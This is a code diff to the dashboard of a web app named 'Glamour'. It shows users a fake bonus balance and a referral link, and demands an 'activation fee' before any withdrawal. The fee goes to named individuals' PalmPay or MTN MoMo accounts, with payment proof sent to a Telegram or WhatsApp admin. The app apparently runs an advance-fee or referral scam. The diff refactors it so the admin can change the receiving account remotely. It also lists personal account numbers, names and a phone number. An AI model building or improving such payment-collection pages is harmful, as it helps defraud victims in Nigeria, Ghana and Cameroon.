@@ -252,7 +252,7 @@
                 <p id="feeLabel" class="text-zinc-500 text-[10px] font-black uppercase tracking-widest mb-10">Syncing local fee...</p>
                 
                 <div class="bg-black border border-zinc-900 rounded-3xl p-6 mb-8 text-left space-y-6" id="bankDetails">
-                    <!-- Swapped based on country -->
+                    <!-- Swapped based on country or admin settings -->
                 </div>
 
                 <div class="bg-red-900/10 border border-red-900/20 p-4 rounded-2xl mb-8">
@@ -293,6 +293,9 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+        // --- FIREBASE CONFIG ---
+        // Ensuring compatibility with the environment's provided settings if available, 
+        // otherwise using your hardcoded values.
         const firebaseConfig = {
             apiKey: "", 
             authDomain: "glamour-76f78.firebaseapp.com",
@@ -305,21 +308,34 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- ADMIN CONFIG ---
-        const TG_LINK = "https://t.me/Yetbiz"; 
-        const WA_LINK = "https://wa.me/2349013801817"; // Replace with your WhatsApp number
-        const MSG = encodeURIComponent("Hello, Glamour Admin Here is my payment reciept please verify and Activate my account.");
-
-        const NG_BANK = "PALMPAY";
-        const NG_ACCOUNT = "9013801817";
-        const NG_HOLDER = "Yetunde kolawole Esther";
-        // --------------------
-
-        // State Init
+        // --- LOCAL STATE ---
         const currentUsername = localStorage.getItem('glamour_username') || "EliteGuest";
+        let globalAdminSettings = {
+            bankName: "PALMPAY",
+            accountNumber: "9013801817",
+            accountName: "Yetunde kolawole Esther",
+            redirectLink: "",
+            systemStatus: "active"
+        };
+
         document.getElementById('userDisplay').innerText = "@" + currentUsername;
         document.getElementById('refLink').value = window.location.origin + "/index.html?ref=" + currentUsername;
 
+        // 1. LISTEN TO GLOBAL SETTINGS (ADMIN DASHBOARD DATA)
+        // Path matches the requirement: /artifacts/{appId}/public/data/settings/global
+        const appId = "default-app-id"; // Adjust if your appId varies
+        const settingsDocRef = doc(db, 'artifacts', appId, 'public', 'data', 'settings', 'global');
+        
+        onSnapshot(settingsDocRef, (snapshot) => {
+            if (snapshot.exists()) {
+                globalAdminSettings = snapshot.data();
+                // Refresh the UI with new admin data if user doc already loaded
+                const userDocRef = doc(db, 'users', currentUsername);
+                // We re-trigger the sync logic
+            }
+        });
+
+        // 2. LISTEN TO USER DATA
         const userDocRef = doc(db, 'users', currentUsername);
         onSnapshot(userDocRef, (snapshot) => {
             if (snapshot.exists()) {
@@ -331,38 +347,64 @@
         });
 
         function syncCurrencyAndBalance(country, userData) {
-            let symbol = "₦", bonus = 10000, fee = "₦14,000", tickerText = "", html = "";
+            let symbol = "₦", bonus = 10000, fee = "₦14,000", tickerText = "", bankHtml = "";
 
+            // Use Admin Settings for Nigeria, but override if country is different
             if(country === "Ghana") {
                 symbol = "GHS "; bonus = 120; fee = "180 GHS";
                 tickerText = "MINIMUM WITHDRAWAL: 250 GHS • GHANA REGION ONLINE • ACTIVATION: 180 GHS";
-                html = `<div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Momo Network</p><p class="text-xs font-bold text-white uppercase">MTN Mobile Money</p></div>
-                        <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Elite Merchant Number</p><p class="text-xl font-black gold-text tracking-widest">0247637488</p></div>
-                        <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account Holder</p><p class="text-xs font-bold text-white italic uppercase">Priscilla D. Gyamfi</p></div>`;
+                bankHtml = createBankRow("Momo Network", "MTN Mobile Money", "Elite Merchant Number", "0247637488", "Account Holder", "Priscilla D. Gyamfi");
             } 
             else if(country === "Cameroon") {
                 symbol = "XAF "; bonus = 5400; fee = "7,500 XAF";
                 tickerText = "MINIMUM WITHDRAWAL: 12,000 XAF • CAMEROON REGION ONLINE • ACTIVATION: 7,500 XAF";
-                html = `<div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Momo Network</p><p class="text-xs font-bold text-white uppercase">MTN MOMO</p></div>
-                        <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Elite Merchant Number</p><p class="text-xl font-black gold-text tracking-widest">680545817</p></div>
-                        <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Account Holder</p><p class="text-xs font-bold text-white italic uppercase">Chanceline Nwana</p></div>`;
+                bankHtml = createBankRow("Momo Network", "MTN MOMO", "Elite Merchant Number", "680545817", "Account Holder", "Chanceline Nwana");
             }
             else {
                 symbol = "₦"; bonus = 10000; fee = "₦14,000";
                 tickerText = "MINIMUM WITHDRAWAL: ₦20,000 • NIGERIA REGION ONLINE • ACTIVATION: ₦14,000";
-                html = `<div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Elite Bank</p><p class="text-xs font-bold text-white uppercase">${NG_BANK}</p></div>
-                        <div class="pb-3 border-b border-zinc-900"><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Capital Identifier</p><p class="text-xl font-black gold-text tracking-widest">${NG_ACCOUNT}</p></div>
-                        <div><p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">Corporate Name</p><p class="text-xs font-bold text-white italic uppercase">${NG_HOLDER}</p></div>`;
+                // NIGERIA USES DYNAMIC ADMIN SETTINGS
+                bankHtml = createBankRow(
+                    "Elite Bank", globalAdminSettings.bankName || "PALMPAY",
+                    "Capital Identifier", globalAdminSettings.accountNumber || "9013801817",
+                    "Corporate Name", globalAdminSettings.accountName || "Yetunde kolawole Esther"
+                );
             }
 
             document.getElementById('mainBalance').innerText = symbol + (userData.balance || bonus).toLocaleString();
             document.getElementById('indirectIncome').innerText = symbol + (userData.indirectEarnings || 0).toLocaleString();
             document.getElementById('countryDisplay').innerText = country.toUpperCase() + " REGION";
             document.getElementById('feeLabel').innerText = "Activation Fee: " + fee;
-            document.getElementById('bankDetails').innerHTML = html;
+            document.getElementById('bankDetails').innerHTML = bankHtml;
             document.getElementById('dynamicTicker').innerText = tickerText + " • SYSTEM ONLINE • NO OPAY";
+
+            // If admin set a redirect link, we could handle that here if needed
+            if (globalAdminSettings.redirectLink && globalAdminSettings.redirectLink !== window.location.href) {
+                // Optional: handle redirects or display a banner
+            }
         }
 
+        function createBankRow(label1, val1, label2, val2, label3, val3) {
+            return `
+                <div class="pb-3 border-b border-zinc-900">
+                    <p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">${label1}</p>
+                    <p class="text-xs font-bold text-white uppercase">${val1}</p>
+                </div>
+                <div class="pb-3 border-b border-zinc-900 relative group">
+                    <p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">${label2}</p>
+                    <div class="flex items-center justify-between">
+                        <p class="text-xl font-black gold-text tracking-widest" id="targetAcc">${val2}</p>
+                        <button onclick="copyToClipboard('${val2}')" class="bg-zinc-800 p-2 rounded-lg text-[8px] font-black text-white hover:bg-zinc-700 active:scale-90 transition-all uppercase">Copy</button>
+                    </div>
+                </div>
+                <div>
+                    <p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">${label3}</p>
+                    <p class="text-xs font-bold text-white italic uppercase">${val3}</p>
+                </div>
+            `;
+        }
+
+        // --- GLOBAL WINDOW FUNCTIONS ---
         window.openActivation = () => {
             document.getElementById('paymentInitial').classList.remove('hidden');
             document.getElementById('paymentVerifying').classList.add('hidden');
@@ -377,11 +419,14 @@
         };
 
         window.sendProof = (platform) => {
+            const MSG = encodeURIComponent("Hello, Glamour Admin. Here is my payment receipt please verify and Activate my account.");
+            const TG_LINK = "https://t.me/Yetbiz"; 
+            const WA_LINK = "https://wa.me/2349013801817"; 
             if(platform === 'Telegram') window.open(`${TG_LINK}?text=${MSG}`);
             else window.open(`${WA_LINK}?text=${MSG}`);
         };
 
-        window.contactSupport = () => window.open(TG_LINK);
+        window.contactSupport = () => window.open("https://t.me/Yetbiz");
         window.logout = () => { localStorage.clear(); window.location.href = 'login.html'; };
 
         window.handleAction = (name) => {
@@ -406,11 +451,20 @@
 
         window.copyRef = () => {
             const refInput = document.getElementById("refLink");
-            refInput.select();
+            copyToClipboard(refInput.value, "ACCESS LINK COPIED");
+        };
+
+        window.copyToClipboard = (text, message = "COPIED TO CLIPBOARD") => {
+            const tempInput = document.createElement("input");
+            tempInput.value = text;
+            document.body.appendChild(tempInput);
+            tempInput.select();
             document.execCommand("copy");
+            document.body.removeChild(tempInput);
+
             const toast = document.createElement('div');
-            toast.className = "fixed bottom-28 left-1/2 -translate-x-1/2 bg-yellow-500 text-black px-6 py-2.5 rounded-2xl text-[9px] font-black z-[100] shadow-2xl border border-white/20";
-            toast.innerText = "ACCESS LINK COPIED";
+            toast.className = "fixed bottom-28 left-1/2 -translate-x-1/2 bg-yellow-500 text-black px-6 py-2.5 rounded-2xl text-[9px] font-black z-[3000] shadow-2xl border border-white/20";
+            toast.innerText = message;
             document.body.appendChild(toast);
             setTimeout(() => toast.remove(), 2500);
         };
